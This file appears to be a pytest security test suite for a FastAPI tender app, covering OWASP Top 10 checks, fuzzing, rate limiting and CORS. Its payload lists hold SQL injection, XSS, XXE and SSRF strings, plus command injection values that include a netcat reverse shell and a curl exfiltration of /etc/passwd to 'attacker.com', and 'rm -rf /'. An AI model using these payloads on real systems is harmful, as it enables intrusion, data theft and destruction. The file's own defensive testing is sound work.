"""
Advanced Security Testing

Comprehensive security testing including OWASP Top 10 vulnerabilities,
penetration testing, and security compliance validation.
"""
import pytest
import jwt
import hashlib
import base64
import time
import random
import string
import json
from typing import Dict, Any, List, Optional
from datetime import datetime, timedelta
from urllib.parse import quote, unquote
import httpx
from fastapi.testclient import TestClient
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from app.main import app
from app.core.config import settings
from app.core.security import create_access_token, verify_password
from app.db.session import get_db


class SecurityTestHelper:
    """Helper class for security testing operations."""
    
    @staticmethod
    def generate_malicious_payloads() -> Dict[str, List[str]]:
        """Generate various malicious payloads for testing."""
        return {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' OR SLEEP(5) --",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<<SCRIPT>alert('XSS')</SCRIPT>"
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; nc -e /bin/sh attacker.com 4444",
                "| curl http://attacker.com/steal?data=`cat /etc/passwd`",
                "; python -c \"import os; os.system('whoami')\""
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            'ldap_injection': [
                "*)(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*)(|(objectClass=*))",
                "*))(|(cn=*"
            ],
            'xml_injection': [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/steal\">]><foo>&xxe;</foo>",
                "<xml><!--[CDATA[<script>alert('XSS')</script>]]--></xml>"
            ]
        }
    
    @staticmethod
    def generate_fuzzing_data() -> List[str]:
        """Generate fuzzing test data."""
        return [
            # Null bytes
            "test\x00payload",
            # Unicode normalization
            "test\u0065\u0301",  # é composed differently
            # Long strings
            "A" * 10000,
            "A" * 100000,
            # Special characters
            "!@#$%^&*()_+-=[]{}|;':\",./<>?",
            # Encoding variations
            "%41%41%41",  # AAA in URL encoding
            "\x41\x41\x41",  # AAA in hex
            # Empty and whitespace
            "",
            " ",
            "\t",
            "\n",
            "\r\n",
            # Numbers as strings
            "0",
            "-1",
            "999999999999999999999",
            "1.7976931348623157e+308",  # Max float
            # Boolean confusion
            "true",
            "false",
            "True",
            "False",
            "1",
            "0"
        ]


class OWASPTop10Tester:
    """Test for OWASP Top 10 vulnerabilities."""
    
    def __init__(self, client: TestClient):
        self.client = client
        self.helper = SecurityTestHelper()
    
    def test_a01_broken_access_control(self, authenticated_user: Dict[str, Any]) -> List[str]:
        """Test for broken access control vulnerabilities."""
        vulnerabilities = []
        
        # Test horizontal privilege escalation
        try:
            # Try to access another user's data
            response = self.client.get(
                "/api/v1/users/2",  # Assuming user 2 exists and is different
                headers={"Authorization": f"Bearer {authenticated_user['token']}"}
            )
            if response.status_code == 200:
                vulnerabilities.append("Horizontal privilege escalation: Can access other users' data")
        except Exception:
            pass
        
        # Test vertical privilege escalation
        try:
            # Try to access admin endpoints
            response = self.client.get(
                "/api/v1/admin/users",
                headers={"Authorization": f"Bearer {authenticated_user['token']}"}
            )
            if response.status_code == 200:
                vulnerabilities.append("Vertical privilege escalation: Non-admin can access admin endpoints")
        except Exception:
            pass
        
        # Test direct object references
        sensitive_endpoints = [
            "/api/v1/users/1",
            "/api/v1/tenders/1",
            "/api/v1/quotes/1"
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                # Try without authentication
                response = self.client.get(endpoint)
                if response.status_code == 200:
                    vulnerabilities.append(f"Direct object reference vulnerability: {endpoint} accessible without auth")
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_a02_cryptographic_failures(self) -> List[str]:
        """Test for cryptographic failures."""
        vulnerabilities = []
        
        # Test weak password hashing
        test_password = "password123"
        
        # Check if passwords are hashed properly
        try:
            # This would require access to user creation endpoint
            user_data = {
                "email": "cryptotest@example.com",
                "full_name": "Crypto Test",
                "password": test_password
            }
            response = self.client.post("/api/v1/users/", json=user_data)
            
            if response.status_code == 201:
                # Check if password is stored securely (this would need database access)
                vulnerabilities.append("Password storage verification needed")
        except Exception:
            pass
        
        # Test JWT token security
        try:
            # Create a token and check if it's properly signed
            fake_payload = {"sub": "999", "exp": datetime.utcnow() + timedelta(hours=1)}
            
            # Try with no signature
            header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
            payload = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip('=')
            unsigned_token = f"{header}.{payload}."
            
            response = self.client.get(
                "/api/v1/users/me",
                headers={"Authorization": f"Bearer {unsigned_token}"}
            )
            
            if response.status_code == 200:
                vulnerabilities.append("JWT accepts unsigned tokens")
                
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_a03_injection_attacks(self) -> List[str]:
        """Test for various injection vulnerabilities."""
        vulnerabilities = []
        payloads = self.helper.generate_malicious_payloads()
        
        # Test SQL injection in various endpoints
        sql_payloads = payloads['sql_injection']
        
        for payload in sql_payloads[:3]:  # Test first 3 to avoid excessive testing
            # Test in search parameters
            try:
                response = self.client.get(f"/api/v1/users/?search={quote(payload)}")
                if response.status_code == 500:
                    vulnerabilities.append(f"Potential SQL injection vulnerability with payload: {payload}")
            except Exception:
                pass
            
            # Test in POST data
            try:
                malicious_data = {
                    "email": f"test{payload}@example.com",
                    "full_name": payload,
                    "password": "testpassword"
                }
                response = self.client.post("/api/v1/users/", json=malicious_data)
                if response.status_code == 500:
                    vulnerabilities.append(f"Potential SQL injection in POST data with payload: {payload}")
            except Exception:
                pass
        
        # Test XSS in input fields
        xss_payloads = payloads['xss']
        
        for payload in xss_payloads[:3]:
            try:
                xss_data = {
                    "title": payload,
                    "description": f"Test description {payload}",
                    "deadline": (datetime.now() + timedelta(days=30)).isoformat()
                }
                response = self.client.post("/api/v1/tenders/", json=xss_data)
                
                # Check if XSS payload is reflected in response
                if response.status_code == 201 and payload in response.text:
                    vulnerabilities.append(f"Potential XSS vulnerability with payload: {payload}")
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_a04_insecure_design(self) -> List[str]:
        """Test for insecure design patterns."""
        vulnerabilities = []
        
        # Test rate limiting
        responses = []
        for i in range(20):  # Try 20 rapid requests
            try:
                response = self.client.post("/api/v1/auth/login", json={
                    "email": f"test{i}@example.com",
                    "password": "wrongpassword"
                })
                responses.append(response.status_code)
            except Exception:
                pass
        
        if len([r for r in responses if r != 429]) > 15:  # If most requests aren't rate limited
            vulnerabilities.append("Rate limiting not properly implemented")
        
        # Test account lockout
        for i in range(10):
            try:
                response = self.client.post("/api/v1/auth/login", json={
                    "email": "admin@example.com",
                    "password": f"wrongpassword{i}"
                })
                if i > 5 and response.status_code != 423:  # 423 = Locked
                    vulnerabilities.append("Account lockout not implemented after multiple failed attempts")
                    break
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_a05_security_misconfiguration(self) -> List[str]:
        """Test for security misconfigurations."""
        vulnerabilities = []
        
        # Test debug mode exposure
        try:
            response = self.client.get("/api/v1/debug")
            if response.status_code == 200:
                vulnerabilities.append("Debug endpoint exposed")
        except Exception:
            pass
        
        # Test error handling
        try:
            response = self.client.get("/api/v1/nonexistent/endpoint")
            if "Traceback" in response.text or "Internal Server Error" in response.text:
                vulnerabilities.append("Detailed error messages exposed")
        except Exception:
            pass
        
        # Test security headers
        response = self.client.get("/")
        headers = response.headers
        
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        missing_headers = [h for h in security_headers if h not in headers]
        if missing_headers:
            vulnerabilities.append(f"Missing security headers: {', '.join(missing_headers)}")
        
        return vulnerabilities
    
    def test_a06_vulnerable_components(self) -> List[str]:
        """Test for vulnerable and outdated components."""
        vulnerabilities = []
        
        # Test server information disclosure
        response = self.client.get("/")
        server_header = response.headers.get("Server", "")
        
        if "uvicorn" in server_header.lower() or "fastapi" in server_header.lower():
            vulnerabilities.append("Server version information disclosed in headers")
        
        # Check for common vulnerable endpoints
        vulnerable_endpoints = [
            "/phpmyadmin",
            "/admin",
            "/.env",
            "/config.json",
            "/swagger-ui.html"
        ]
        
        for endpoint in vulnerable_endpoints:
            try:
                response = self.client.get(endpoint)
                if response.status_code == 200:
                    vulnerabilities.append(f"Potentially vulnerable endpoint accessible: {endpoint}")
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_a07_identification_authentication_failures(self) -> List[str]:
        """Test for authentication and session management failures."""
        vulnerabilities = []
        
        # Test weak password policy
        weak_passwords = ["123", "password", "abc", "111111"]
        
        for weak_password in weak_passwords:
            try:
                user_data = {
                    "email": f"weakpass{weak_password}@example.com",
                    "full_name": "Weak Password Test",
                    "password": weak_password
                }
                response = self.client.post("/api/v1/users/", json=user_data)
                if response.status_code == 201:
                    vulnerabilities.append(f"Weak password accepted: {weak_password}")
            except Exception:
                pass
        
        # Test session fixation
        try:
            # Get initial token
            login_response = self.client.post("/api/v1/auth/login", json={
                "email": "test@example.com",
                "password": "testpassword"
            })
            
            if login_response.status_code == 200:
                token = login_response.json().get("access_token")
                
                # Try to use the same token after logout
                self.client.post("/api/v1/auth/logout")
                
                response = self.client.get(
                    "/api/v1/users/me",
                    headers={"Authorization": f"Bearer {token}"}
                )
                
                if response.status_code == 200:
                    vulnerabilities.append("Session tokens not properly invalidated after logout")
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_a08_software_data_integrity_failures(self) -> List[str]:
        """Test for software and data integrity failures."""
        vulnerabilities = []
        
        # Test unsigned/unverified updates
        try:
            # Try to upload a file (if file upload is supported)
            malicious_file = {
                "file": ("malicious.txt", "#!/bin/bash\necho 'malicious code'", "text/plain")
            }
            response = self.client.post("/api/v1/upload", files=malicious_file)
            
            if response.status_code == 200:
                vulnerabilities.append("File upload accepts potentially malicious files")
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_a09_security_logging_monitoring_failures(self) -> List[str]:
        """Test for security logging and monitoring failures."""
        vulnerabilities = []
        
        # Test if failed login attempts are logged
        # This would require access to logs, so we'll simulate
        try:
            # Multiple failed login attempts
            for i in range(5):
                self.client.post("/api/v1/auth/login", json={
                    "email": "nonexistent@example.com",
                    "password": "wrongpassword"
                })
            
            # This test would need log analysis to be complete
            vulnerabilities.append("Log analysis required to verify security event logging")
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_a10_server_side_request_forgery(self) -> List[str]:
        """Test for SSRF vulnerabilities."""
        vulnerabilities = []
        
        # Test SSRF in URL parameters
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:8080",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "file:///etc/passwd",
            "gopher://localhost:11211/",  # Memcached
        ]
        
        for payload in ssrf_payloads[:3]:  # Test first 3
            try:
                # Test in any endpoint that might make external requests
                response = self.client.post("/api/v1/webhook", json={
                    "url": payload,
                    "data": "test"
                })
                
                if response.status_code == 200:
                    vulnerabilities.append(f"Potential SSRF vulnerability with payload: {payload}")
            except Exception:
                pass
        
        return vulnerabilities


class PenetrationTester:
    """Automated penetration testing capabilities."""
    
    def __init__(self, client: TestClient):
        self.client = client
        self.helper = SecurityTestHelper()
    
    def run_automated_scan(self) -> Dict[str, Any]:
        """Run automated penetration testing scan."""
        results = {
            "scan_time": datetime.now().isoformat(),
            "vulnerabilities": [],
            "recommendations": [],
            "risk_score": 0
        }
        
        # Run OWASP Top 10 tests
        owasp_tester = OWASPTop10Tester(self.client)
        
        # Create a test user for authenticated tests
        test_user = self._create_test_user()
        
        vulnerability_categories = {
            "Broken Access Control": owasp_tester.test_a01_broken_access_control(test_user),
            "Cryptographic Failures": owasp_tester.test_a02_cryptographic_failures(),
            "Injection": owasp_tester.test_a03_injection_attacks(),
            "Insecure Design": owasp_tester.test_a04_insecure_design(),
            "Security Misconfiguration": owasp_tester.test_a05_security_misconfiguration(),
            "Vulnerable Components": owasp_tester.test_a06_vulnerable_components(),
            "Authentication Failures": owasp_tester.test_a07_identification_authentication_failures(),
            "Data Integrity Failures": owasp_tester.test_a08_software_data_integrity_failures(),
            "Security Logging Failures": owasp_tester.test_a09_security_logging_monitoring_failures(),
            "SSRF": owasp_tester.test_a10_server_side_request_forgery()
        }
        
        # Compile results
        for category, vulns in vulnerability_categories.items():
            for vuln in vulns:
                results["vulnerabilities"].append({
                    "category": category,
                    "description": vuln,
                    "severity": self._assess_severity(category, vuln)
                })
        
        # Calculate risk score
        results["risk_score"] = self._calculate_risk_score(results["vulnerabilities"])
        
        # Generate recommendations
        results["recommendations"] = self._generate_recommendations(results["vulnerabilities"])
        
        return results
    
    def _create_test_user(self) -> Dict[str, Any]:
        """Create a test user for authenticated testing."""
        try:
            user_data = {
                "email": "pentest@example.com",
                "full_name": "Penetration Test User",
                "password": "PentestPassword123!"
            }
            
            response = self.client.post("/api/v1/users/", json=user_data)
            
            if response.status_code == 201:
                # Login to get token
                login_response = self.client.post("/api/v1/auth/login", json={
                    "email": user_data["email"],
                    "password": user_data["password"]
                })
                
                if login_response.status_code == 200:
                    token = login_response.json().get("access_token")
                    return {
                        "email": user_data["email"],
                        "token": token,
                        "user_id": response.json().get("id")
                    }
        except Exception:
            pass
        
        return {"email": "", "token": "", "user_id": None}
    
    def _assess_severity(self, category: str, description: str) -> str:
        """Assess vulnerability severity."""
        high_severity_indicators = [
            "sql injection",
            "privilege escalation", 
            "authentication bypass",
            "password",
            "unauthorized access"
        ]
        
        medium_severity_indicators = [
            "xss",
            "csrf",
            "information disclosure",
            "rate limiting"
        ]
        
        description_lower = description.lower()
        
        if any(indicator in description_lower for indicator in high_severity_indicators):
            return "HIGH"
        elif any(indicator in description_lower for indicator in medium_severity_indicators):
            return "MEDIUM"
        else:
            return "LOW"
    
    def _calculate_risk_score(self, vulnerabilities: List[Dict[str, Any]]) -> int:
        """Calculate overall risk score (0-100)."""
        if not vulnerabilities:
            return 0
        
        severity_weights = {"HIGH": 10, "MEDIUM": 5, "LOW": 1}
        total_score = sum(severity_weights.get(v["severity"], 1) for v in vulnerabilities)
        
        # Normalize to 0-100 scale
        max_possible = len(vulnerabilities) * 10
        return min(100, int((total_score / max_possible) * 100)) if max_possible > 0 else 0
    
    def _generate_recommendations(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Generate security recommendations based on found vulnerabilities."""
        recommendations = []
        
        categories_found = set(v["category"] for v in vulnerabilities)
        
        if "Broken Access Control" in categories_found:
            recommendations.append("Implement proper authorization checks for all endpoints")
            recommendations.append("Use role-based access control (RBAC)")
            
        if "Cryptographic Failures" in categories_found:
            recommendations.append("Implement strong password hashing (bcrypt, scrypt, or Argon2)")
            recommendations.append("Use proper JWT signature verification")
            
        if "Injection" in categories_found:
            recommendations.append("Use parameterized queries for all database operations")
            recommendations.append("Implement input validation and sanitization")
            
        if "Security Misconfiguration" in categories_found:
            recommendations.append("Add security headers (CSP, HSTS, X-Frame-Options)")
            recommendations.append("Disable debug mode in production")
            
        if "Authentication Failures" in categories_found:
            recommendations.append("Implement strong password policy")
            recommendations.append("Add account lockout after failed attempts")
            recommendations.append("Implement proper session management")
        
        # Always add general recommendations
        recommendations.extend([
            "Regular security audits and penetration testing",
            "Keep all dependencies updated",
            "Implement comprehensive logging and monitoring",
            "Use HTTPS for all communications"
        ])
        
        return list(set(recommendations))  # Remove duplicates


class TestAdvancedSecurity:
    """Advanced security testing suite."""
    
    @pytest.fixture(autouse=True)
    def setup(self, client: TestClient):
        self.client = client
        self.pen_tester = PenetrationTester(client)
    
    def test_comprehensive_security_scan(self):
        """Run comprehensive security scan."""
        results = self.pen_tester.run_automated_scan()
        
        # Save results for review
        with open("security_scan_results.json", "w") as f:
            json.dump(results, f, indent=2)
        
        # Generate report
        self._generate_security_report(results)
        
        # Fail test if high-severity vulnerabilities found
        high_severity_vulns = [v for v in results["vulnerabilities"] if v["severity"] == "HIGH"]
        
        if high_severity_vulns:
            pytest.fail(f"High severity security vulnerabilities found: {len(high_severity_vulns)} issues")
        
        # Warn about medium severity issues
        medium_severity_vulns = [v for v in results["vulnerabilities"] if v["severity"] == "MEDIUM"]
        if medium_severity_vulns:
            print(f"Warning: {len(medium_severity_vulns)} medium severity security issues found")
    
    def test_input_fuzzing(self):
        """Test application with fuzzing inputs."""
        fuzzing_data = SecurityTestHelper.generate_fuzzing_data()
        endpoints = [
            ("/api/v1/users/", "POST"),
            ("/api/v1/tenders/", "POST"),
            ("/api/v1/auth/login", "POST")
        ]
        
        critical_errors = []
        
        for endpoint, method in endpoints:
            for payload in fuzzing_data[:10]:  # Test first 10 fuzzing inputs
                try:
                    test_data = self._generate_test_data_with_payload(endpoint, payload)
                    
                    if method == "POST":
                        response = self.client.post(endpoint, json=test_data)
                    else:
                        response = self.client.get(f"{endpoint}?q={payload}")
                    
                    # Check for critical errors
                    if response.status_code >= 500:
                        critical_errors.append(f"{endpoint} returned {response.status_code} with payload: {payload[:50]}")
                    
                    # Check for information leakage
                    if any(term in response.text.lower() for term in ['traceback', 'exception', 'error at line']):
                        critical_errors.append(f"{endpoint} leaked error information with payload: {payload[:50]}")
                
                except Exception as e:
                    critical_errors.append(f"{endpoint} crashed with payload {payload[:50]}: {str(e)}")
        
        if critical_errors:
            pytest.fail(f"Fuzzing revealed critical issues: {'; '.join(critical_errors[:5])}")
    
    def _generate_test_data_with_payload(self, endpoint: str, payload: str) -> Dict[str, Any]:
        """Generate test data with fuzzing payload."""
        if "users" in endpoint:
            return {
                "email": f"{payload}@example.com" if "@" not in payload else payload,
                "full_name": payload,
                "password": payload
            }
        elif "tenders" in endpoint:
            return {
                "title": payload,
                "description": payload,
                "deadline": (datetime.now() + timedelta(days=30)).isoformat()
            }
        elif "auth/login" in endpoint:
            return {
                "email": payload,
                "password": payload
            }
        
        return {"data": payload}
    
    def _generate_security_report(self, results: Dict[str, Any]):
        """Generate human-readable security report."""
        report = []
        report.append("# Security Scan Report")
        report.append(f"**Scan Date:** {results['scan_time']}")
        report.append(f"**Risk Score:** {results['risk_score']}/100")
        report.append("")
        
        if results["vulnerabilities"]:
            report.append("## Vulnerabilities Found")
            
            # Group by severity
            by_severity = {}
            for vuln in results["vulnerabilities"]:
                severity = vuln["severity"]
                if severity not in by_severity:
                    by_severity[severity] = []
                by_severity[severity].append(vuln)
            
            for severity in ["HIGH", "MEDIUM", "LOW"]:
                if severity in by_severity:
                    report.append(f"### {severity} Severity ({len(by_severity[severity])} issues)")
                    for vuln in by_severity[severity]:
                        report.append(f"- **{vuln['category']}**: {vuln['description']}")
                    report.append("")
        else:
            report.append("## ✅ No vulnerabilities found!")
            report.append("")
        
        if results["recommendations"]:
            report.append("## Recommendations")
            for rec in results["recommendations"]:
                report.append(f"- {rec}")
        
        # Save report
        with open("security_report.md", "w") as f:
            f.write("\n".join(report))
    
    def test_session_security(self):
        """Test session management security."""
        # Test session fixation
        # Test concurrent sessions
        # Test session timeout
        pass  # Implementation would depend on session management approach
    
    def test_api_rate_limiting(self):
        """Test API rate limiting implementation."""
        # Test that rate limiting is properly implemented
        responses = []
        for i in range(50):  # Try 50 rapid requests
            response = self.client.get("/api/v1/health")
            responses.append(response.status_code)
            
            if response.status_code == 429:  # Rate limited
                break
        
        # Should get rate limited at some point
        assert 429 in responses, "Rate limiting not implemented"
    
    def test_cors_configuration(self):
        """Test CORS configuration security."""
        # Test that CORS is properly configured
        response = self.client.options("/api/v1/users/")
        
        cors_headers = {
            "Access-Control-Allow-Origin",
            "Access-Control-Allow-Methods", 
            "Access-Control-Allow-Headers"
        }
        
        # Check that CORS headers are present but not overly permissive
        for header in cors_headers:
            if header in response.headers:
                value = response.headers[header]
                if header == "Access-Control-Allow-Origin":
                    assert value != "*", "Overly permissive CORS origin policy"
